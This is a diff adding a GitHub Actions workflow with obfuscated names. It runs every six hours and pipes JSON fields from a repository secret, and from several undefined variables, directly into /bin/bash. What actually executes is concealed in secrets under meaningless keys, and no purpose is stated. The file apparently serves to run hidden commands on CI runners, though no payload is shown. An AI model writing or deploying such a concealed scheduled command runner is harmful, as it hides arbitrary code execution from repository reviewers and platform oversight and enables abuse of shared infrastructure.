@@ -1,0 +1,24 @@
+name: zuoaihaowann
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuoaihaowann
+        env:
+          hgvh15: ${{ secrets.hgvh15 }}
+        run: |
+          echo $hgvh15 | jq -r .hu65 | /bin/bash
+          echo $ars2 | jq -r .uknyu77 | /bin/bash
+          echo $cs19847 | jq -r .zqtc5 | /bin/bash
+          echo $ihij09 | jq -r .ju36 | /bin/bash
+          echo $pbbpf4679 | jq -r .exny49 | /bin/bash
+          echo $bhum50580 | jq -r .lwm639 | /bin/bash
+          echo $th05 | jq -r .lbr29597 | /bin/bash
+          echo $yg5 | jq -r .w7034 | /bin/bash
+
